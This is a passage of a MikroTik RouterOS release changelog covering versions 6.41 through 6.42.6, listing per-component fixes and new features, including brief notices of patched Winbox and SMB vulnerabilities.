*) wireless - added option to disable PMKID for WPA2;
*) wireless - fixed memory leak when performing wireless scan on ARM;
*) wireless - fixed packet processing after removing wireless interface from CAP settings;
*) wireless - updated "united-states" regulatory domain information;

What's new in 6.42.6 (2018-Jul-06 11:56):

*) bridge - improved packets processing when bridge port changes states;
*) crs3xx - fixed bonding slave failover when packets are sent out of the bridge interface;
*) crs3xx - fixed LACP member failover;
*) crs3xx - improved link state detection when one side has disabled interface;
*) defconf - fixed bridge default configuration for SOHO devices with more than 9 Ethernet interfaces;
*) package - free up used storage space consumed by old RouterOS upgrades;
*) snmp - fixed w60g "phy-rate" readings;
*) supout - added "ip-cloud" section to supout file;
*) w60g - fixed random disconnects;
*) w60g - general stability and performance improvements;
*) winbox - added 64,8 GHz frequency to w60g interface frequency settings;
*) winbox - show "sector-writes" on devices that have such counters;

What's new in 6.42.5 (2018-Jun-26 12:12):

*) api - properly classify API sessions in log;
*) chr - enabled promiscuous mode (requires to be enabled on host as well) when running CHR on Hyper-V;
*) kidcontrol - added dynamic accept firewall rules to allow bandwidth limit when FastTrack is enabled;
*) led - fixed LED default configuration for LtAP mini;
*) snmp - added "rssi" and "tx-sector-info" value support for w60g type interfaces;
*) snmp - added station "distance", "phy-rate", "rssi" value support for w60g type interfaces;
*) ssh - allow to use "diffie-hellman-group1-sha1" on TILE and x86 devices with "strong-crypto" disabled;
*) w60g - added 4th 802.11ad channel (CLI only);
*) w60g - added distance measurement;
*) w60g - do not reset interface after adding comment;
*) w60g - general stability and performance improvements;
*) w60g - improved maximum achievable distance;
*) w60g - properly report center status under "tx-sector-info";
*) winbox - show "sector-writes" on ARM devices that have such counters;
*) winbox - show "System/Health" only on devices that have health monitoring;

What's new in 6.42.4 (2018-Jun-15 14:14):

*) bridge - allow to make changes for bridge port when it is interface list;
*) bridge - fixed FastPath for bridge master interfaces (introduced in v6.42);
*) certificate - fixed "add-scep" template existence check when signing certificate;
*) chr - fixed adding MSTI entries;
*) chr - fixed boot on hosts older than Windows Server 2012 when running CHR on Hyper-V;
*) chr - fixed various network hang scenarios when running CHR on Hyper-V;
*) console - fixed script permissions if script is executed by other RouterOS service;
*) dhcpv4-server - fixed DHCP server that was stuck on invalid state;
*) health - changed "PSU-Voltage" to "PSU-State" for CRS328-4C-20S-4S+;
*) health - fixed incorrect PSU index for CRS328-4C-20S-4S+;
*) ipsec - improved reliability on IPsec hardware encryption for RB1100Dx4;
*) kidcontrol - fixed dynamically created firewall rules order;
*) led - added "dark-mode" functionality for hEX S and SXTsq 5 ac devices;
*) led - fixed CCR1016-12S-1S+ LED behaviour after Netinstall (introduced in v6.41rc58);
*) led - use routers uptime as a starting point when turning off LEDs if option was not enabled on boot;
*) ppp - fixed "hunged up" grammar to "hung up" within PPP log messages;
*) quickset - added missing wireless "channel-width" settings;
*) quickset - added support for "5ghz-a/n" band when CPE mode is used;
*) snmp - added remote CAP count OID for CAPsMAN;
*) snmp - fixed readings for CAPsMAN slave interfaces;
*) supout - added "partitions" section to supout file;
*) usb - properly detect USB 3.0 flash on RBM33G when jumper is removed;
*) userman - improved unique username generation process when adding batch of users;
*) w60g - improved RAM memoy allocation processes;
*) winbox - added missing "dscp" and "clamp-tcp-mss" settings to IPv6 tunnels;
*) winbox - allow to specify full URL in SCEP certificate signing process;
*) winbox - by default specify keepalive timeout value for tunnel type interfaces;
*) winbox - show "scep-url" for certificates;
*) winbox - show "System/Health" only on boards that have health monitoring;
*) winbox - show firmware upgrade message at the bottom of "System/RouterBOARD" menu;
*) wireless - enable all chains by default on devices without external antennas after configuration reset;
*) wireless - improved Nv2 reliability on ARM devices;

What's new in 6.42.3 (2018-May-24 09:20):

*) lte - fixed automatic LTE band selection for R11e-LTE;
*) wireless - improved client "channel-width" detection;
*) wireless - improved Nv2 PtMP performance;
*) wireless - increased stability on hAP ac^2 and cAP ac with legacy data rates;

What's new in 6.42.2 (2018-May-17 09:20):

*) bridge - do not allow to add same interface list to bridge more than once;
*) bridge - fixed LLDP packet receiving;
*) bridge - fixed processing of fragmented packets when hardware offloading is enabled;
*) console - fixed type "on" and "wireless-status" LED trigger value setting (introduced in v6.42.1);
*) crs317 - fixed link flapping when inserted S+RJ10 module without any cable;
*) defconf - fixed wAP LTE kit default configuration;
*) dhcpv4 - prevent sending out ICMP port unreachable packets;
*) dhcpv4-client - fixed DHCP client stuck in renewing state;
*) dhcpv6-relay - fixed missing configuration after reboot;
*) filesystem - fixed NAND memory going into read-only mode;
*) hotspot - fixed user authentication when queue from old session is not removed yet;
*) interface - fixed "built-in=no" parameter for manually created interface lists;
*) interface - fixed "dynamic" built-in interface list behaviour;
*) interface - fixed interface list which include disabled member;
*) interface - fixed interface list which include/exclude another list;
*) interface - fixed interface configuration responsiveness;
*) ipsec - fixed policies becoming invalid if added after a disabled policy;
*) ipsec - improved reliability on IPsec hardware encryption for ARM devices except RB1100Dx4;
*) led - added "dark-mode" functionality for hAP ac and hAP ac^2 devices;
*) lte - improved LTE communication process on MMIPS platform devices;
*) quickset - fixed dual radio mode detection process;
*) routerboard - properly represent board name for hAP ac^2;
*) tile - fixed Ethernet interfaces becoming unresponsive;
*) winbox - allow to specify "any" as wireless "access-list" interface;
*) winbox - fixed "/ip dhcp-server network set dns-none" parameter;
*) wireless - enable all chains by default on devices without external antennas after configuration reset;
*) wireless - fixed packet processing when "static-algo-0=40bit-wep" is being used (introduced in v6.42);
*) wireless - fixed usage of allowed signal strength values received from RADIUS;
*) wireless - improved wireless throughput on hAP ac^2 and cAP ac;
*) x86 - fixed reboot caused by MAC Winbox connection;

What's new in 6.42.1 (2018-Apr-23 10:46):

!) winbox - fixed vulnerability that allowed to gain access to an unsecured router;
*) bridge - fixed hardware offloading for MMIPS and PPC devices;
*) bridge - fixed LLDP packet receiving;
*) crs3xx - fixed failing connections through bonding in bridge;
*) ike2 - use "policy-template-group" parameter when picking proposal as initiator;
*) led - added "dark-mode" functionality for hAP ac and hAP ac^2 devices;
*) led - improved w60g alignment trigger;
*) lte - allow to send "at-chat" command over disabled LTE interface;
*) routerboard - fixed "mode-button" support on hAP lite r2 devices;
*) w60g - allow to manually set "tx-sector" value;
*) w60g - fixed incorrect RSSI readings;
*) w60g - show phy rate on "/interface w60g monitor" (CLI only);
*) winbox - fixed bridge port MAC learning parameter values;
*) winbox - show "Switch" menu on cAP ac devices;
*) winbox - show correct "Switch" menus on CRS328-24P-4S+;
*) wireless - improved compatibility with BCM chipset devices;

What's new in 6.42 (2018-Apr-13 11:03):

!) tile - improved system performance and stability ("/system routerboard upgrade" required);
!) w60g - increased distance for wAP 60G to 200+ meters;
*) bridge - added host aging timer for CRS3xx and Atheros hw-bridges;
*) bridge - added per-port forwarding options for broadcasts, unknown-multicasts and unknown-unicasts;
*) bridge - added per-port learning options;
*) bridge - added support for static hosts;
*) bridge - fixed "master-port" configuration conversion from pre-v6.41 RouterOS versions;
*) bridge - fixed bridge port interface parameter under "/interface bridge host print detail";
*) bridge - fixed false MAC address learning on hAP ac^2 and cAP ac devices;
*) bridge - fixed incorrect "fast-forward" enabling when ports were switched;
*) bridge - fixed MAC learning for VRRP interfaces on bridge;
*) bridge - fixed reliability on software bridges when used on devices without switch chip;
*) bridge - hide options for disabled bridge features in CLI;
*) bridge - show "hw" flags only on Ethernet interfaces and interface lists;
*) capsman - added "allow-signal-out-of-range" option for Access List entries;
*) capsman - added support for "interface-list" in Access List and Datapath entries;
*) capsman - improved CAPsMAN responsiveness with large amount of CAP interfaces;
*) capsman - log "signal-strength" when successfully connected to AP;
*) certificate - added PKCS#10 version check;
*) certificate - dropped DES support and added AES instead for SCEP;
*) certificate - dropped MD5 support and require SHA1 as minimum for SCEP;
*) certificate - fixed incorrect SCEP URL after an upgrade;
*) chr - added "open-vm-tools" on VMware installations;
*) chr - added "qemu-guest-agent" and "virtio-scsi" driver on KVM installations;
*) chr - added "xe-daemon" on Xen installations;
*) chr - added support for Amazon Elastic Network Adapter (ENA) driver;
*) chr - added support for booting from NVMe disks;
*) chr - added support for Hyper-V ballooning, guest quiescing, host-guest file transfer, integration services and static IP injection;
*) chr - added support for NIC hot-plug on VMware and Xen installations;
*) chr - fixed additional disk detaching on Xen installations;
*) chr - fixed interface matching by name on VMware installations;
*) chr - fixed interface naming order when adding more than 4 interfaces on VMware installations;
*) chr - fixed suspend on Xen installations;
*) chr - make additional disks visible under "/disk" on Xen installations;
*) chr - make Virtio disks visible under "/disk" on KVM installations;
*) chr - run startup scripts on the first boot on AWS and Google Cloud installations;
*) console - fixed "idpr-cmtp" protocol by changing its value from 39 to 38;
*) console - improved console stability after it has not been used for a long time;
*) crs1xx/2xx - added BPDU value for "ingress-vlan-translation" menu "protocol" option;
*) crs212 - fixed Ethernet boot when connected to boot server through CRS326 device;
*) crs326 - fixed known multicast flooding to the CPU;
*) crs3xx - added switch port "storm-rate" limiting options;
*) crs3xx - added “hw-offload” support for 802.3ad and “balance-xor” bonding;
*) detnet - fixed "detect-internet" feature unavailability if router had too long identity (introduced in v6.41);
*) dhcp - improved DHCP service reliability when it is configured on bridge interface;
*) dhcp - reduced resource usage of DHCP services;
*) dhcpv4-server - added "dns-none" option to "/ip dhcp-server network dns";
*) dhcpv6 - make sure that time is set before restoring bindings;
*) dhcpv6-client - added info exchange support;
*) dhcpv6-client - added possibility to specify options;
*) dhcpv6-client - added support for options 15 and 16;
*) dhcpv6-client - implement confirm after reboot;
*) dhcpv6-server - added DHCPv4 style user options;
*) dns - do not generate "Undo" messages on changes to dynamic servers;
*) email - set maximum number of sessions to 100;
*) fetch - added "http-content-type" option to allow setting MIME type of the data in free text form;
*) fetch - added "output" option for all modes in order to return result to file, variable or ignore it;
*) fetch - increased maximum number of sessions to 100;
*) filesystem - implemented additional system storage maintenance checks on ARM CPU based devices;
*) flashfig - properly apply configuration provided by Flashfig;
*) gps - improved NMEA sentence handling;
*) health - added log warning when switching between redundant power supplies;
*) health - fixed empty measurements on CRS328-24P-4S+RM;
*) hotspot - improved HTTPS matching in Walled Garden rules;
*) ike1 - display error message when peer requests "mode-config" when it is not configured;
*) ike1 - do not accept "mode-config" reply more than once;
*) ike1 - fixed wildcard policy lookup on responder;
*) ike2 - fixed framed IP address received from RADIUS server;
*) interface - improved interface configuration responsiveness;
*) ippool - added ability to specify comment;
*) ippool6 - added pool name to "no more addresses left" error message;
*) ipsec - fixed AES-CTR and AES-GCM support on RB1200;
*) ipsec - improved single tunnel hardware acceleration performance on MMIPS devices;
*) ipsec - properly detect interface for "mode-config" client IP address assignment;
*) ipv6 - fixed IPv6 behaviour when bridge port leaves bridge;
*) ipv6 - update IPv6 DNS from RA only when it is changed;
*) kidcontrol - initial work on "/ip kid-control" feature;
*) led - added "Dark Mode" support for wAP 60G;
*) led - added w60g alignment trigger;
*) led - fixed unused "link-act-led" LED trigger on RBLHG 2nD, RBLHG 2nD-XL and RBSXTsq 2nD;
*) led - removed unused "link-act-led" trigger for devices which does not use it;
*) lte - added initial support for Quectel LTE EP06-E;
*) lte - added initial support for SIM7600 LTE modem interface;
*) lte - added support for the user and password authentication for wAP-LTE-kit-US (R11e-LTE-US);
*) lte - do not add DHCP client on LTE modems that doesn't use DHCP;
*) lte - fixed DHCP client adding for MF823 modem;
*) lte - fixed LTE band setting for SXT LTE;
*) mac-ping - fixed duplicate responses;
*) modem - added initial support for AC340U;
*) netinstall - fixed MMIPS RouterOS package description;
*) netinstall - sign Netinstall executable with an Extended Validation Code Signing Certificate;
*) netwatch - limit to read, write, test and reboot policies for Netwatch script execution;
*) poe - do not show "poe-out-current" on devices which can not determine it;
*) poe - hide PoE related properties on interfaces that does not provide power output;
*) ppp - added initial support for NETGEAR AC340U and ZyXEL WAH1604;
*) ppp - allow to override remote user PPP profile via "Mikrotik-Group";
*) quickset - fixed NAT if PPPoE client is used for Internet access;
*) quickset - properly detect IP address when one of the bridge modes is used;
*) quickset - properly detect LTE interface on startup;
*) quickset - show "G" flag for guest users;
*) quickset - use "/24" subnet for local network by default;
*) r11e-lte - improved LTE connection initialization process;
*) rb1100ahx4 - improved reliability on hardware encryption;
*) routerboard - added RouterBOOT "auto-upgrade" after RouterOS upgrade (extra reboot required);
*) routerboard - properly detect hAP ac^2 RAM size;
*) sniffer - fixed "/tool sniffer packet" results listed in incorrect order;
*) snmp - added "/caps-man interface print oid";
*) snmp - added "/interface w60g print oid";
*) snmp - added "board-name" OID;
*) snmp - improved request processing performance for wireless and CAP interfaces;
*) ssh - fixed SSH service becoming unavailable;
*) ssh - generate SSH keys only on the first connect attempt instead of the first boot;
*) ssh - improved key import error messages;
*) ssh - remove imported public SSH keys when their owner user is removed;
*) switch - hide "ingress-rate" and "egress-rate" for non-CRS3xx switches;
*) tile - added "aes-ctr" hardware acceleration support;
*) tr069-client - added "DownloadDiagnostics" and "UploadDiagnostics";
*) tr069-client - correctly return “TransferComplete” after vendor configuration file transfer;
*) tr069-client - fixed "/tool fetch" commands executed with ".alter" script;
*) tr069-client - fixed HTTPS authentication process;
*) traffic-flow - fixed IPv6 destination address value when IPFIX protocol is used;
*) upgrade - improved RouterOS upgrade process and restrict upgrade from RouterOS older than v5.16;
*) ups - improved communication between router and UPS;
*) ups - improved disconnect message handling between RouterOS and UPS;
*) userman - added support for ARM and MMIPS platform;
*) w60g - added "tx-power" setting (CLI only);
*) w60g - added RSSI information (CLI only);
*) w60g - added TX sector alignment information (CLI only);
*) watchdog - retry to send "autosupout.rif" file to an e-mail if initial delivery failed up to 3 times within 20 second interval;
*) winbox - added "antenna" setting under GPS settings for MIPS platform devices;
*) winbox - added "crl-store" setting to certificate settings;
*) winbox - added "insert-queue-before" to DHCP server;
*) winbox - added "use-dn" setting in OSPF instance General menu;
*) winbox - added 160 MHz "channel-width" to wireless settings;
*) winbox - added DHCPv6 client info request type and updated statuses;
*) winbox - added missing protocol numbers to IPv4 and IPv6 firewall;
*) winbox - added possibility to delete SMS from inbox;
*) winbox - allow to comment new object without committing it;
*) winbox - allow to open bridge host entry;
*) winbox - fixed name for "out-bridge-list" parameter under bridge firewall rules;
*) winbox - fixed typo from "UPtime" to "Uptime";
*) winbox - fixed Winbox closing when viewing graph which does not contain any data;
*) winbox - improved stability when using trackpad scrolling in large lists;
*) winbox - made UDP local and remote TX size parameters optional in Bandwidth Test tool;
*) winbox - moved "ageing-time" setting from STP to General tab;
*) winbox - moved OSPF instance "routing-table" setting in OSPF instance General menu;
*) winbox - removed “VLAN” section from “Switch” menu for CRS3xx devices;
*) winbox - show Bridge Port PVID column by default;
*) winbox - show CQI in LTE info;
*) winbox - show dual SIM options only for RouterBOARDS which does have two SIM slots;
*) winbox - show only master CAP interfaces under CAPsMAN wireless scan tool;
*) winbox - use proper graph name for HDD graphs;
*) wireless - added "realm-raw" setting for "/interface wireless interworking-profiles" (CLI only);
*) wireless - added initial support for "nstreme-plus";
*) wireless - added support for "band=5ghz-n/ac";
*) wireless - added support for "interface-list" for Access List entries;
*) wireless - added support for legacy AR9485 chipset;
*) wireless - enable all chains by default on devices without external antennas after configuration reset;
*) wireless - fixed "wds-slave" channel selection when single frequency is specified;
*) wireless - fixed incompatibility with macOS clients;
*) wireless - fixed long "scan-list" entries not working for ARM based wireless interfaces;
*) wireless - fixed nv2 protocol on ARM platform SXTsq devices;
*) wireless - fixed RB911-5HnD low transmit power issue;
*) wireless - fixed RTS/CTS option for the ARM based wireless devices;
*) wireless - fixed wsAP wrong 5 GHz interface MAC address;
*) wireless - improved compatibility with specific wireless AC standard clients;
*) wireless - improved Nv2 PtMP performance;
*) wireless - improved packet processing on ARM platform devices;
*) wireless - improved wireless performance on hAP ac^2 devices while USB is being used;
*) wireless - improved wireless scan functionality;

What's new in 6.41.4 (2018-Apr-05 12:23):

!) tile - improved overall system performance and stability ("/system routerboard upgrade" required);
*) led - fixed unused "link-act-led" LED trigger on RBLHG 2nD, RBLHG 2nD-XL and RBSXTsq 2nD;
*) led - removed unused "link-act-led" trigger for devices which does not use it;
*) netinstall - sign Netinstall executable with an Extended Validation Code Signing Certificate;
*) poe - do not show "poe-out-current" on devices which can not determine it;
*) poe - hide PoE related properties on interfaces which does not provide power output;
*) winbox - made UDP local and remote TX size parameters optional in Bandwidth Test tool;
*) winbox - show dual SIM options only for RouterBOARDs which does have two SIM slots;
*) winbox - use proper graph name for HDD graphs;
*) wireless - enable all chains by default on devices without external antennas after configuration reset;

What's new in 6.41.3 (2018-Mar-08 11:55):

!) smb - fixed buffer overflow vulnerability, everyone using this feature is urged to upgrade;
!) tile - improved overall system performance and stability ("/system routerboard upgrade" required);
*) chr - automatically generate new system ID on first startup;
*) console - do not allow variables that start with digit to be referenced without "$" sign;
*) defconf - fixed DISC Lite5 LED default configuration;
*) export - fixed "/system routerboard mode-button" compact export;
*) filesystem - improved error correction process on RB1100AHx4 storage;
*) firewall - fixed "tls-host" firewall feature (introduced in v6.41);
*) gps - added GPS port support for Quectel EC25-E modem when used in LTE mode;
*) lte - fixed r11-LTE-US interface initialization process after reboot;
*) romon - make "secret" field sensitive in console;
*) snmp - fixed w60g SSID value;
*) tile - fixed bogus voltage readings;
*) tr069-client - fixed TR069 service becoming unavailable when related service package is not available;
*) usb - improved packet processing over USB modems;
*) winbox - fixed "/tool e-mail send" attachment behavior;
*) winbox - fixed maximal ID for Traffic Generator stream;
*) winbox - removed "Enable" and "Disable" buttons from IPsec "mode-config" list;
*) winbox - show "D" flag under "/ip dhcp-client" menu;
*) wireless - removed unused "/interface wireless registration-table monitor" command;

What's new in 6.41.2 (2018-Feb-06 12:29):

*) bridge - fixed ARP settings on bridge interfaces (introduced v6.41);
*) discovery - fixed discovery interface list change;
*) disk - fixed disk related processes becoming unresponsive after unplugging used disk;
*) filesystem - fixed situations when "/flash" directory lost files after upgrade;
*) ppp - do not lose "/ppp profile" script configuration after other profile parameters are edited;
*) routerboard - properly report warnings under "/system routerboard" menu;
*) snmp - added w60g support;
*) w60g - fixed "/interface w60g reset-configuration";
*) webfig - fixed backup loading from Webfig on RouterBOARD running default configuration;
*) winbox - changed default bridge port PVID value to 1;
*) wireless - fixed wireless protocol mode restrictions if lockpack is installed and has limits for it;

What's new in 6.41.1 (2018-Jan-30 10:26):

*) bridge - fixed "mst-override" export;
*) bridge - fixed allowed MSTI priority values;
*) bridge - fixed ARP option changing on bridge (introduced v6.41);
*) bridge - fixed hw-offload disabling for Mediatek and Realtek switches when STP/RSTP configured;
*) bridge - fixed hw-offload disabling when adding a port with "horizon" set;
*) bridge - fixed IGMP Snooping after disabling/enabling bridge;
*) bridge - fixed interface list moving in "/interface bridge port" menu;
*) bridge - fixed repetitive port "priority" set;
*) bridge - fixed situation when packet could be sent with local MAC as dst-mac;
*) bridge - fixed VLAN filtering when "use-ip-firewall" is enabled (introduced in v6.41);
*) bridge - properly update "actual-mtu" after MTU value changes (introduced v6.41);
*) btest - fixed TCP test accuracy when low TX/RX rates are used;
*) certificate - do not use utf8 for SCEP challenge password;
*) certificate - fixed PKCS#10 version;
*) crs317 - improved transmit performance between 10G and 1G ports;
*) crs326 - fixed possible packet leaking from CPU to switch ports;
*) crs3xx - hide deprecated VLAN related settings in "/interface ethernet switch port" menu;
*) detnet - additional work on "detect-internet" implementation;
*) dhcpv4-server - fixed framed and classless route received from RADIUS server;
*) discovery - fixed discovery related settings conversation during upgrade from pre-v6.41 discovery implementation (introduced v6.41);
*) dude - fixed e-mail notifications when default port is not used;
*) firewall - fixed "tls-host" firewall feature (introduced v6.41);
*) firewall - limited maximum "address-list-timeout" value to 35w3d13h13m56s;
*) ike1 - fixed "aes-ctr" and "aes-gcm" encryption algorithms (introduced v6.41);
*) ike2 - delay rekeyed peer outbound SA installation;
*) ike2 - improve half-open connection handling;
*) ipsec - properly update IPsec secret for IPIP/EoIP/GRE dynamic peer;
*) log - properly report bridge interface MAC address changes;
*) netinstall - improved LTE package description;
*) netinstall - properly generate skins folder when branding package is installed;
*) ovpn - fixed resource leak on systems with high CPU usage;
*) ppp - changed default value of "route-distance" to 1;
*) ppp - fixed change-mss functionality in some specific traffic (introduced in v6.41);
*) radius - added warning if PPP authentication over RADIUS is enabled;
*) radius - increase allowed RADIUS server timeout to 60s;
*) rb1100ahx4 - fixed reset button responsiveness when regular firmware is used;
*) rb433/rb450 - fixed port flapping on bridged Ethernet interfaces if hw-offload is enabled (introduced in v6.41);
*) routerboot - fixed missing upgrade firmware for "ar7240" devices;
*) sfp - improved SFP module compatibility;
*) snmp - allow also IPv6 on default public community;
*) tile - fixed USB device speed detection after reboot;
*) traffic-flow - do not count single extra packet per each flow;
*) webfig - added support for proper default policies when adding script or scheduler job;
*) webfig - fixed bridge port sorting order by name;
*) webfig - fixed MAC address ordering;
*) webfig - fixed wireless snooper address, SSID and other column ordering;
*) winbox - added "dhcp-option-set" to DHCP server;
*) winbox - allow to specify "to-ports" for "action=masquerade";
*) winbox - do not show "hw" option on non-Ethernet interfaces;
*) winbox - do not show VLAN related settings in switch port menu on CRS3xx boards;
*) wireless - updated "Czech Republic" country 5.8 GHz frequency range;

What's new in 6.41 (2017-Dec-22 11:55):

Important note!!! Backup before upgrade!
RouterOS (v6.40rc36-rc40 and) v6.41rc1+ contains new bridge implementation that supports hardware offloading (hw-offload).
This update will convert all interface "master-port" configuration into new bridge configuration, and eliminate "master-port" option as such.
Bridge will handle all Layer2 forwarding and the use of switch-chip (hw-offload) will be automatically turned on based on appropriate conditions.
The rest of RouterOS Switch specific configuration remains untouched in usual menus for now.
Please, note that downgrading to previous RouterOS versions will not restore "master-port" configuration, so use backups to restore configuration on downgrade.

!) bridge - implemented software based vlan-aware bridges;
https://wiki.mikrotik.com/wiki/Manual:Interface/Bridge#Bridge_VLAN_Filtering
!) switch - "master-port" conversion into a bridge with hardware offload "hw" option;
https://wiki.mikrotik.com/wiki/Manual:Switch_Chip_Features#Bridge_Hardware_Offloading
!) detnet - implemented "/interface detect-internet" feature;
https://wiki.mikrotik.com/wiki/Manual:Detect_internet
!) bridge - general implementation of hw-offload bridge (introduced in v6.40rc36);
!) routerboot - RouterBOOT version numbering system merged with RouterOS;
!) w60g - added Point to Multipoint support;
!) w60g - revised "master" and "slave" interface modes to more familiar "bridge", "ap-bridge", "station-bridge";
!) wireless - new driver with initial support for 160 and 80+80 MHz channel width;
*) arm - minor improvements on CPU load distribution for RB1100 series devices;
*) arp - fixed invalid static ARP entries after reboot on interfaces without IP address;
*) bgp - added 32-bit private ASN support;
*) bridge - added comment support for VLANs;
*) bridge - added initial support for hardware "igmp-snooping" on CRS1xx/2xx;
*) bridge - added support for "/interface list" as a bridge port;
*) bridge - assume "point-to-point=yes" for all Full Duplex Ethernet interfaces when STP is used (as per standard);
*) bridge - automatically turn off "fast-forward" feature if both bridge ports have "H" flag;
*) bridge - changed "Host" and "MDB" table column order;
*) bridge - disable "hw-offload" when "horizon" or "external-fdb" is set;
*) bridge - fixed "fast-forward" counters;
*) bridge - fixed ARP setting (introduced in v6.40rc36);
*) bridge - fixed connectivity issues when there are multiple VLAN interfaces on bridge;
*) bridge - fixed hw-offloaded IGMP Snooping service getting stopped;
*) bridge - fixed multicast forwarding (introduced in v6.40rc36);
*) bridge - implemented dynamic entries for active MST port overrides;
*) bridge - implemented software based "igmp-snooping";
*) bridge - implemented software based MSTP;
*) bridge - removed "frame-types" and "ingress-filtering" for bridge interfaces (introduced in v6.40rc36);
*) bridge - set "igmp-snooping=no" by default on new bridges;
*) bridge - show "admin-mac" only if "auto-mac=no";
*) bridge - show bridge interface local addresses in the host table;
*) btest - improved reliability on Bandwidth Test when device`s RAM is almost full;
*) capsman - added "vlan-mode=no-tag" option;
*) capsman - added possibility to downgrade CAP with Upgrade command from CAPsMAN;
*) capsman - return complete CA chain when issuing new certificate;
*) capsman - use "adaptive-noise-immunity" value from CAP local configuration;
*) certificate - added option to store CRL in RAM (CLI only);
*) certificate - fixed SCEP "get" request URL encoding;
*) certificate - improved CRL update after system startup;
*) certificate - show "Expired" flag when initial CRL fetch fails;
*) certificate - show invalid flag when local CRL file does not exist;
*) chr - added KVM memory balloon support;
*) chr - added suspend support;
*) console - do not stop "/certificate sign" process if console times out in 1 minute;
*) console - removed "/setup";
*) crs317 - added initial support for HW offloaded MPLS forwarding;
*) crs317 - fixed reliability on FAN controller;
*) crs326 - fixed packet processing speed on switch chip if individual port link speed differs;
*) crs326 - improved transmit performance from SFP+ to Ethernet ports;
*) crs3xx - added ingress/egress rate input limits;
*) crs3xx - hide unused switch "vlan-mode", "vlan-header-mode" and "default-vlan-id" options;
*) crs3xx - switch VLAN configuration integrated within bridge VLAN configuration with hw-offload;
*) dhcp - fixed DHCP services failing after reboot when DHCP option was used;
*) dhcp - fixed unresponsive DHCP service caused by inability to read not set RAW options;
*) dhcp - require DHCP option name to be unique;
*) dhcp-client - limit and enforce DHCP client "default-route-distance" minimal value to 1;
*) dhcp-server - added "option-set" argument (CLI only);
*) dhcp-server - added basic RADIUS accounting;
*) dhcpv4-client - add dynamic DHCP client for mobile clients which require it;
*) dhcpv4-client - allow to use DUID for client as identity string as the option 61;
*) dhcpv4-server - added "NETWORK_GATEWAY" option variable;
*) dhcpv4-server - strip trailing "\0" in "hostname" if present;
*) discovery - use "/interface list" instead of interface name under neighbor discovery settings;
*) e-mail - do not show errors when sending e-mail from script;
*) eoip - made L2MTU parameter read-only;
*) ethernet - removed "master-port" parameter;
*) export - fixed interface list export;
*) fetch - accept all HTTP 2xx status codes;
*) filesystem - implemented additional system integrity checks on reboots;
*) firewall - added "tls-host" firewall matcher;
*) health - fixed bogus voltage readings on CCR1009;
*) hotspot - fixed "dst-port" to require valid "protocol" in "walled-garden ip";
*) hotspot - fixed Walled Garden IP functionality when address-list is used;
*) ike1 - DPD retry interval set to 5 seconds;
*) ike1 - disallow peer creation using base mode;
*) ike1 - fixed crash on xauth if user does not exist;
*) ike1 - fixed memory corruption when IPv6 is used;
*) ike1 - improved stability on phase1 rekeying;
*) ike1 - release mismatched PH2 peer IDs;
*) ike1 - use /32 netmask if none provided by mode config;
*) ike2 - added support for multiple split networks;
*) ike2 - check identities on "initial-contact";
*) ike2 - do not allow to configure nat-traversal;
*) ike2 - fixed PH1 lifetime reset on boot;
*) ike2 - fixed initiator DDoS cookie processing;
*) ike2 - fixed responder DDoS cookie first notify type check;
*) ike2 - kill connection when peer changes address;
*) ike2 - use peer configuration address when available on empty TSi;
*) interface - added "/interface reset-counters" command (CLI only);
*) interface - added default "/interface list" "dynamic" which contains dynamic interfaces;
*) interface - added option to join and exclude "/interface list" from one and another;
*) interface - fixed corrupted "/interface list" configuration after upgrade;
*) ippool6 - try to assign desired prefix for client if prefix is not being already used;
*) ipsec - added DH groups 19, 20 and 21 support for phase1 and phase2;
*) ipsec - allow to specify "remote-peer" address as DNS name;
*) ipsec - fixed incorrect esp proposal key size usage;
*) ipsec - fixed policy enable/disable;
*) ipsec - improved hardware accelerated IPSec performance on 750Gr3;
*) ipsec - improved reliability on certificate usage;
*) ipsec - renamed "firewall" argument to "notrack-chain" in peer configuration;
*) ipsec - skip invalid policies for phase2;
*) ipv6 - add dynamic "/ip dns" server address from RA when RA is permitted by configuration;
*) l2tp - improved reliability on packet processing in FastPath;
*) l2tp-server - fixed PPP services becoming unresponsive after changes on L2TP server with IPSec configuration;
*) lcd - fixed "flip-screen=yes" state after reboot;
*) log - added "bridge" topic;
*) log - fixed interface name in log messages;
*) log - optimized "poe-out" logging topic logs;
*) lte - added "/interface lte apn" menu (Passthrough requires reconfiguration);
*) lte - added Passthrough support;
*) lte - added Yota non-configurable modem support;
*) lte - added support for ZTE ME3630 E1C with additional "/port" for GPS usage;
*) lte - automatically add "/ip dhcp-client" configuration on interface;
*) lte - changed default values to "add-default-route=yes", "use-peer-dns=yes" and "default-route-distance=2";
*) lte - fixed Passthrough support;
*) lte - fixed authentication for non LTE modes;
*) lte - fixed error when trying to add APN profile without name;
*) lte - fixed rare crash when initializing LTE modem after reset;
*) lte - fixed user authentication for R11e-LTE when new firmware is used;
*) lte - integrated IP address acquisition without DHCP client for wAP LTE kit-US;
*) lte - limited minimal default route distance to 1;
*) lte - update info command with "location area code" and "physical cell id" values;
*) m11g - improved ethernet performance on high load;
*) mac-server - use "/interface list" instead of interface name under MAC server settings;
*) modem - added initial support for Alcatel IK40 and Olicard 500;
*) neighbor - show neighbors on actual bridge port instead of bridge itself
*) netinstall - fixed missing "/flash/etc" on first bootup;
*) netinstall - fixed missing default configuration prompt on first startup after reset/netinstall;
*) ospf - fixed OSPF v2 and v3 neighbor election;
*) ovpn-server - do not periodically change automatically generated server MAC address;
*) poe - added new "poe-out" status "controller-error";
*) poe - fixed false positive excessive logs in auto-on mode when connected to 100 Mbps device powered from another power source;
*) poe - log PoE status related messages under debug topic;
*) ppp - added initial support for PLE902;
*) ppp - added support for Sierra MC7750, Verizon USB730L;
*) ppp - do not disconnect PPP connection after "idle-timeout" even if traffic is being processed;
*) ppp - fixed "change-mss" functionality when MSS option is missing on forwrded packets;
*) ppp - fixed L2TP and PPTP encryption negotiation process on configuration changes;
*) ppp - fixed situation when part of PPP configuration was reset to default values after reboot;
*) pppoe-client - properly re-establish MLPPP session when one of the lines stopped transmitting packets;
*) pppoe-server - fixed situation when PPPoE servers become invalid on reboot;
*) quickset - added support for "/interface list" in firewall, neighbor discovery, MAC-Telnet and MAC-Winbox;
*) quickset - fixed LTE quickset mode APN field;
*) quickset - fixed situation when Quickset automatically changes mode to CPE;
*) quickset - renamed router IP static DNS name to "router.lan";
*) radius - limited RADIUS timeout maximum value to 3 seconds;
*) route - fixed potential route crash on routing table update;
*) scheduler - properly display long scheduler configuration;
*) sfp - fixed SFP interface power monitor when bad SFP DDMI information is received;
*) sftp - added functionality which imports ".auto.rsc" file or reboots router on ".auto.npk" upload;
